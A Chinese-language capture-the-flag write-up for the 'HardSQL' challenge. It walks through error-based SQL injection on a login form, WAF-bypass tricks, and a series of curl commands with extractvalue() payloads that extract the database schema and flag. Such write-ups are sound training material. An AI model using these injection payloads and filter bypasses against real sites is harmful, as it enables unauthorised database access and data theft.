# [极客大挑战 2019]HardSQL

## 题目概述
一个登录页面，表单提交到 `check.php`，存在 SQL 注入漏洞，但有 WAF 过滤常见关键字。

## 信息收集
- 访问首页发现登录表单，GET 方式提交到 `check.php`
- 参数：`username`, `password`
- 测试单引号报错，确认存在 SQL 注入，后端为 MariaDB
- 错误信息直接回显到页面，适合报错注入

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：报错注入（Error-based SQL Injection）

**WAF过滤规则**：
| 被过滤 | 绕过方式 |
|--------|----------|
| 空格 | 用括号 `()` 包裹关键字和参数 |
| `and`/`or` | 用 `^`（异或）代替 |
| `=` | 用 `like` 代替 |
| `-- ` | 用 `#` 注释 |
| `union` | 改用报错注入 |

**判断过程**：
1. 单引号触发 SQL 语法错误，确认注入点
2. 测试常见关键字，发现 `or`, `and`, `union`, `=` 等被过滤
3. 测试空格，发现被过滤，用括号成功绕过
4. 使用 `extractvalue()` 报错注入成功获取数据

## 利用过程（Payload + Flag）

```bash
# 1. 获取数据库名
# Payload: admin'^extractvalue(1,concat(0x7e,(select(database())),0x7e))#
curl "URL?username=admin'^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23&password=123"
# 结果: geek

# 2. 获取表名
curl "URL?username=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like'geek'),0x7e))%23&password=123"
# 结果: H4rDsq1

# 3. 获取列名
curl "URL?username=admin'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like'H4rDsq1'),0x7e))%23&password=123"
# 结果: id,username,password

# 4. 获取flag前半部分
curl "URL?username=admin'^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e))%23&password=123"
# 结果: flag{02eaf8a7-ca61-4671-a455-06

# 5. 获取flag后半部分（extractvalue最多显示32字符）
curl "URL?username=admin'^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e))%23&password=123"
# 结果: 7-ca61-4671-a455-06d292a651b6}

# 拼接完整flag: flag{02eaf8a7-ca61-4671-a455-06d292a651b6}
```

## 复现步骤
1. 访问题目 URL，发现登录表单
2. 测试 `username=admin'` 触发 SQL 错误
3. 测试 WAF 过滤规则，确定被过滤的关键字
4. 使用括号绕过空格，`^` 绕过 `and`，`like` 绕过 `=`
5. 使用 `extractvalue()` 报错注入获取数据库信息
6. 由于 `extractvalue()` 返回长度限制，分两次获取完整 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心Payload | 知识点 |
|----------|----------|-------------|--------|
| 报错注入 | username参数 | `'^extractvalue(1,concat(0x7e,(select...),0x7e))#` | WAF绕过、extractvalue用法 |

## 知识总结（解题技巧、同类题型套路）

1. **WAF绕过套路**：空格→括号，and/or→^/||，等号→like/regexp
2. **报错注入函数**：`extractvalue()`、`updatexml()`，返回长度限制32字符
3. **长度限制绕过**：用 `left()`、`right()`、`substr()` 分段读取
4. **注释符选择**：`#` 比 `-- ` 更通用，不易被过滤
